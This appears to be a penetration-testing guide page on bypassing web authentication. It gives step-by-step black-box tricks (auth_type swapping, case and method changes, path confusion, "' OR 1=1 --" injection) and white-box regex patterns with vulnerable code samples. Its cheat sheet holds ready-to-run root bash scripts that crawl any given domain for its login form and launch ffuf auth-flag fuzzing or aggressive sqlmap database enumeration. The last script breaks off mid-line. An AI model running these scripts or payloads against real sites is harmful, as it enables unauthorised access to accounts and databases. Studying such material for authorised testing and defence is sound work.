# Bypassing Authentication Schema

## Check List

* [ ] Ensure that authentication is applied across all services that require it.

## Methodology

### Black Box

#### Auth Type Manipulation

{% stepper %}
{% step %}
Log in to the target site, go to the authentication page, and check if it uses multiple types of authentication, such as password, email, Google, and Facebook
{% endstep %}

{% step %}
Enter the request using an incorrect password and email address. Intercept the POST request using Bupr Suite
{% endstep %}

{% step %}
Then examine the intercepted request and see if you see a parameter called `auth_type`
{% endstep %}

{% step %}
If you see such a parameter that specifies the type of authentication with Google or Facebook or password and email, send the request to the repeater
{% endstep %}

{% step %}
And then change the authentication type in the `auth_type` parameter to facebook

```json
"auth_type": "email" → "facebook"
```
{% endstep %}

{% step %}
If the user information is displayed in the server response, the authentication bypass is confirmed
{% endstep %}
{% endstepper %}

***

#### Email Domain Validation Bypass

{% stepper %}
{% step %}
Access registration form
{% endstep %}

{% step %}
Enter email `test@redacted.com`, Capture `POST` request in Burp
{% endstep %}

{% step %}
Notice server prepends or validates only suffix (`@redacted.com`)

```http
email=bishal@redacted.com
```
{% endstep %}

{% step %}
Modify email domain to any external domain

```
email=bishal0x01@bugcrowdninja.com
```
{% endstep %}

{% step %}
Send request
{% endstep %}

{% step %}
Receive verification email at `bishal0x01@bugcrowdninja.com`
{% endstep %}

{% step %}
Click link, Account activated
{% endstep %}
{% endstepper %}

***

#### Change The Letter Case

{% stepper %}
{% step %}
Use the [enumerate Application](https://unk9vvn.gitbook.io/penetration-testing/web/reconnaissance/enumerate-applications) command to perform the identification process and obtain the sensitive paths of the admin panel
{% endstep %}

{% step %}
Access known admin path

```http
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 in response, then send the following request

```http
GET /AdMiN HTTP/1.1
GET /ADMIN HTTP/1.1
GET /aDmIn HTTP/1.1
GET /Admin HTTP/1.1
GET /aDMIN HTTP/1.1
```
{% endstep %}

{% step %}
If any variation returns 200 OK, Case sensitivity bypass confirmed
{% endstep %}
{% endstepper %}

***

#### HTTP Method Bypass Auth

{% stepper %}
{% step %}
Make a request to the admin panel and check if it gives you a 403 in response
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 then change the HTTP method to PUT or Patch or ...

```http
PATCH /admin HTTP/1.1
HEAD /admin HTTP/1.1
PUT /admin HTTP/.1.1
```
{% endstep %}
{% endstepper %}

***

#### Path Confusion Auth Bypass

{% stepper %}
{% step %}
Request a sensitive route like the panel or admin route and if it gives you a 403, try to mislead the route using the payload below

```http
GET /%2e%2e/admin HTTP/1.1
```
{% endstep %}

{% step %}
If the server response shows login or admin information, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### [Bypass Auth Via SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

{% stepper %}
{% step %}
Navigate to the SignUp page of the target website, typically located at a URL like `/signup` or `/register` Open https://example.com/signup in the browser
{% endstep %}

{% step %}
Identify the “Full Name” input field in the SignUp form, which is prone to processing user input directly into database queries Find the text box labeled “Full Name” in the form
{% endstep %}

{% step %}
Enter the payload `' OR 1=1 --` into the Full Name field to attempt bypassing the query’s conditions and access unauthorized data Input `John' OR 1=1 --` in the Full Name field
{% endstep %}

{% step %}
Click the `“Sign Up”` button to send the payload to the server via a <sub>POST</sub> request
{% endstep %}

{% step %}
Look for a generic error (“Invalid input”) or a `400`/`500` status code, indicating the payload was blocked, or unexpected success, suggesting a vulnerability
{% endstep %}

{% step %}
If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again. Compare responses: if `' OR 1=1 --` allows form submission or data access (account creation without valid input) while `' OR 1=2 --` fails, it confirms SQL injection, as the true condition (`1=1`) altered the query’s logic
{% endstep %}
{% endstepper %}

***

### White Box

#### Bypass Authentication via Path Traversal

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw all endpoints in XMind
{% endstep %}

{% step %}
Decompile the web server based on the programming language used
{% endstep %}

{% step %}
In the code, look for classes and functions that process authentication endpoints
{% endstep %}

{% step %}
Then, in the class that handles the authentication endpoint, look for paths in the code where exceptions exist and authentication is bypassed, like in the code below

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>Request\.(Path|PathBase|RawUrl))|(?<Sink>Contains\s*\(\s*"/(actuator|admin|health)"\s*\)|EndsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>getNormalizeURI\s*\(|getRequestURI\s*\(|getPathInfo\s*\()|(?<Sink>contains\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_SERVER\['REQUEST_URI'\])|(?<Sink>strpos\s*\(|preg_match\s*\(|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.(originalUrl|url|path))|(?<Sink>includes\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}
{% endtabs %}

RipGrep (Regex Detection (Linux))

{% tabs %}
{% tab title="C#" %}
```regex
(Request\.(Path|PathBase|RawUrl))|(Contains\s*\(\s*"/(actuator|admin|health)"\s*\)|EndsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Java" %}
```regex
(getNormalizeURI\s*\(|getRequestURI\s*\(|getPathInfo\s*\()|(contains\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_SERVER\['REQUEST_URI'\])|(strpos\s*\(|preg_match\s*\(|skipAuth\s*=\s*true)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.(originalUrl|url|path))|(includes\s*\(\s*"/(actuator|admin|health)"\s*\)|endsWith\s*\(\s*"/v1/ping"\s*\)|skipAuth\s*=\s*true)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Patterns**

{% tabs %}
{% tab title="C#" %}
```csharp
string clienturi = URIUtil.GetNormalizeURI(request);
// ...

if (clienturi.Contains("/actuator") || clienturi.EndsWith("/v1/ping") /* ... */)
{
    skipAuth = true;
}
```
{% endtab %}

{% tab title="Java" %}
```java
String clienturi = URIUtil.getNormalizeURI(request);
// ...

if (clienturi.contains("/actuator") || clienturi.endsWith("/v1/ping") /* ... */) {
    skipAuth = true;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
$clienturi = URIUtil::getNormalizeURI($request);
// ...

if (strpos($clienturi, "/actuator") !== false || str_ends_with($clienturi, "/v1/ping") /* ... */) {
    $skipAuth = true;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const clienturi = URIUtil.getNormalizeURI(request);
// ...

if (clienturi.includes("/actuator") || clienturi.endsWith("/v1/ping") /* ... */) {
    skipAuth = true;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Also review how the request is received and processed

{% tabs %}
{% tab title="C#" %}
```csharp
public static string GetNormalizeURI(HttpRequest request)
{
    string uri = request.Path.Value;
    return RemoveExtraSlash(
        Uri.UnescapeDataString(
            new Uri(uri, UriKind.RelativeOrAbsolute)
                .Normalize()
                .ToString()
        )
    );
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static String getNormalizeURI(HttpServletRequest request) {
    String uri = request.getRequestURI();
    return removeExtraSlash(
        URLDecoder.decode(
            URI.create(uri).normalize().toString(),
            StandardCharsets.UTF_8
        )
    );
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function getNormalizeURI($request)
{
    $uri = $request->getRequestUri();
    return self::removeExtraSlash(
        urldecode(
            (new \GuzzleHttp\Psr7\Uri($uri))
                ->normalize()
                ->__toString()
        )
    );
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
function getNormalizeURI(request) {
    const uri = request.url;
    return removeExtraSlash(
        decodeURIComponent(
            new URL(uri, 'http://localhost').pathname
        )
    );
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
The final request will look like the following

```hurl
/portalapi/v1/users/username/admin;%2fv1%2fping
```
{% endstep %}
{% endstepper %}

***

#### Authentication Bypass via Error Dispatcher

{% stepper %}
{% step %}
Map the entire target system using the Burp Suite tool
{% endstep %}

{% step %}
Map the entry points and endpoints in Xmind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Note all pre-login endpoints and license-related endpoints in the code and configuration that make security decisions based on the **URL path**, such as the path below

```hurl
/license/Unlicensed.xhtml
```
{% endstep %}

{% step %}
Intentionally add invalid paths to the URL and send requests to trigger error handling

```
/license/Unlicensed.xhtml/x
```
{% endstep %}

{% step %}
Then review this path in the code under the error-handling logic to check whether an unauthenticated user is given a session for communication or not

**VSCode (Regex Detection**)

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>HttpContext\.Items|Request\.(Query|Params))|(?<Sink>StartsWith\s*\(|Activate|License|Admin)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>getAttribute\s*\(\s*"javax\.servlet\.error\.[^"]+"\s*\)|getParameter\s*\()|(?<Sink>startsWith\s*\(|requestOnlineActivation\s*\(|activate|Unlicensed\.xhtml)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_(GET|REQUEST|SERVER))|(?<Sink>strpos\s*\(|activate|license|admin)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.(query|originalUrl|headers))|(?<Sink>startsWith\s*\(|activate|license|admin)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection (Linux)**)

{% tabs %}
{% tab title="C#" %}
```regex
(HttpContext\.Items|Request\.(Query|Params))|(StartsWith\s*\(|Activate|License|Admin)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>getAttribute\s*\(\s*"javax\.servlet\.error\.[^"]+"\s*\)|getParameter\s*\()|(?<Sink>startsWith\s*\(|requestOnlineActivation\s*\(|activate|Unlicensed\.xhtml)
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(GET|REQUEST|SERVER))|(strpos\s*\(|activate|license|admin)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.(query|originalUrl|headers))|(startsWith\s*\(|activate|license|admin)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Patterns**

{% tabs %}
{% tab title="C#" %}
```c#
protected void DoGet(HttpRequest request, HttpResponse response)
{
    int? statusCode = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error is HttpException httpEx ? (int?)httpEx.StatusCode : null;
    string message = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error?.Message;
    Type exceptionType = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error?.GetType();
    string requestUri = request.Path;
    Exception exception = request.HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error;
    string remoteAddr = request.HttpContext.Connection.RemoteIpAddress?.ToString();
    string gaRequestAction = request.Query["GARequestAction"];

    if (statusCode == null && exceptionType == null && exception == null)
    {
        response.StatusCode = 404;
    }
    else if (!BypassHandling(statusCode, requestUri))
    {
        if (requestUri.StartsWith(request.PathBase + "/license/Unlicensed.xhtml")) // [1]
        {
            if (!string.IsNullOrEmpty(gaRequestAction) && gaRequestAction.Equals("activate", StringComparison.OrdinalIgnoreCase))
            {
                string token = SessionUtilities.GenerateLicenseRequestToken(request.HttpContext.Session); // [2]
                try
                {
                    LicenseUtilities.RequestOnlineActivation(request, response, token); // [3]
                    return;
                }
                catch (Exception ex)
                {
                    LOGGER.LogError(ex, ex.Message);
                }
            }

            response.Redirect(requestUri);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static void doGet(HttpServletRequest req, HttpServletResponse res) throws Exception {
    Integer statusCode = req.getStatus() != 0 ? req.getStatus() : null;
    String message = req.getAttribute("message") != null ? req.getAttribute("message").toString() : null;
    Class<?> exceptionType = req.getAttribute("error") != null
            ? req.getAttribute("error").getClass()
            : null;
    String requestUri = req.getRequestURI();
    Object exception = req.getAttribute("error");
    String remoteAddr = req.getRemoteAddr();
    String gaRequestAction = req.getParameter("GARequestAction");

    if (statusCode == null && exceptionType == null && exception == null) {
        res.setStatus(HttpServletResponse.SC_NOT_FOUND);
        res.getWriter().write("Not Found");
    } else if (!bypassHandling(statusCode, requestUri)) {
        if (requestUri.startsWith(req.getContextPath() + "/license/Unlicensed.xhtml")) { // [1]
            if (gaRequestAction != null && gaRequestAction.toLowerCase().equals("activate")) {
                String token = SessionUtilities.generateLicenseRequestToken(req.getSession()); // [2]
                try {
                    LicenseUtilities.requestOnlineActivation(req, res, token); // [3]
                    return;
                } catch (Exception err) {
                    System.err.println(err.getMessage());
                    err.printStackTrace();
                }
            }

            res.sendRedirect(requestUri);
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function doGet(Request $request, Response $response)
{
    $statusCode = $request->attributes->get('javax.servlet.error.status_code');
    $message = $request->attributes->get('javax.servlet.error.message');
    $exceptionType = $request->attributes->get('javax.servlet.error.exception_type');
    $requestUri = $request->attributes->get('javax.servlet.error.request_uri');
    $exception = $request->attributes->get('javax.servlet.error.exception');
    $remoteAddr = $request->ip();
    $gaRequestAction = $request->query('GARequestAction');

    if ($statusCode === null && $exceptionType === null && $exception === null) {
        return response()->setStatusCode(404);
    } elseif (!$this->bypassHandling($statusCode, $requestUri)) {
        if (str_starts_with($requestUri, $request->getBasePath() . "/license/Unlicensed.xhtml")) { // [1]
            if (!empty($gaRequestAction) && strcasecmp($gaRequestAction, "activate") === 0) {
                $token = SessionUtilities::generateLicenseRequestToken($request->session()); // [2]
                try {
                    LicenseUtilities::requestOnlineActivation($request, $response, $token); // [3]
                    return;
                } catch (\Exception $e) {
                    $this->LOGGER->error($e->getMessage(), ['exception' => $e]);
                }
            }

            return redirect($requestUri);
        }
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
async function doGet(req, reply) {
    const statusCode = req.statusCode || null;
    const message = req.message || null;
    const exceptionType = req.error?.constructor || null;
    const requestUri = req.url;
    const exception = req.error || null;
    const remoteAddr = req.ip;
    const gaRequestAction = req.query.GARequestAction;

    if (!statusCode && !exceptionType && !exception) {
        reply.status(404).send('Not Found');
    } else if (!bypassHandling(statusCode, requestUri)) {
        if (requestUri.startsWith(req.routerPath + "/license/Unlicensed.xhtml")) { // [1]
            if (gaRequestAction && gaRequestAction.toLowerCase() === "activate") {
                const token = SessionUtilities.generateLicenseRequestToken(req.session); // [2]
                try {
                    await LicenseUtilities.requestOnlineActivation(req, reply, token); // [3]
                    return;
                } catch (err) {
                    req.log.error(err.message, err);
                }
            }

            reply.redirect(requestUri);
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Finally, by abusing the path error, it is possible to obtain a session for connection and interaction
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### Parameter Modification <a href="#parameter-modification" id="parameter-modification"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-params.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git curl golang ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=12341234@"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Auth Bypass Header
payload_list="/tmp/payloads.txt"
cat > $payload_list << EOF
authenticated=yes
authenticated=true
authenticated=1
logged_in=yes
logged_in=true
logged_in=1
is_logged_in=yes
is_logged_in=true
is_logged_in=1
is_authenticated=yes
is_authenticated=true
is_authenticated=1
auth=yes
auth=true
auth=1
auth_user=yes
auth_user=true
auth_user=1
auth_user_id=yes
auth_user_id=true
auth_user_id=1
auth_role=yes
auth_role=true
auth_role=1
auth_role_id=yes
auth_role_id=true
auth_role_id=1
auth_role_name=yes
auth_role_name=true
auth_role_name=1
EOF
​
# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL?FUZZ" \
         -w "$payload_list:FUZZ" \
         -X GET \
         -ac -c -r -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION?FUZZ" \
         -w "$payload_list:FUZZ" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-params.sh;sudo ./auth-bypass-params.sh $WEBSITE
```

### Session ID Prediction <a href="#session-id-prediction" id="session-id-prediction"></a>

{% hint style="info" %}
Burpsuite > Intercept Request (Generative Page) > Right Click > Send Sequencer Section > Start Analyze
{% endhint %}

### SQL Injection (HTML Form Authentication) <a href="#sql-injection-html-form-authentication" id="sql-injection-html-form-authentication"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [SQLMap](https://github.com/sqlmapproject/sqlmap)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-sqli.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git curl golang ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=12341234@"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers - Define directly in sqlmap format (name: value)
SQLMAP_HEADERS="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,fa-IR;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: $URL
Sec-GPC: 1
Connection: keep-alive
Referer: $LOGIN
Upgrade-Insecure-Requests: 1
Priority: u=0, i"

# Run SQLMAP
if [[ "$METHOD" == "get" ]]; then
    SQLMAP_URL="${FULL_ACTION}?${DATA}"
    sqlmap -u "$SQLMAP_URL" \
           --headers="$SQLMAP_HEADERS" \
           --cookie="$COOKIES" \
           --batch --level=5 --risk=3 -v 3 \
           --random-agent --threads=10 \
           --tamper=space2comment,randomcase \
           --not-string="invalid\|incorrect\|failed\|error\|denied" \
           --dbs --banner --current-user --current-db --is-dba

else
    sqlmap -u "$FULL_ACTION" \
           --data="$DATA" \
           --headers="$SQLMAP_HEADERS" \
           --cookie="$COOKIES" \
           --batch --level=5 --risk=3 -v 3 \
           --random-agent --threads=10 \
           --tamper=space2comment,randomcase \
           --not-string="invalid\|incorrect\|failed\|error\|denied" \
           --dbs --banner --current-user --current-db --is-dba
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-sqli.sh;sudo ./auth-bypass-sqli.sh $WEBSITE
```

### PHP Loose Comparison <a href="#php-loose-comparison" id="php-loose-comparison"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-tj.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git curl golang ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
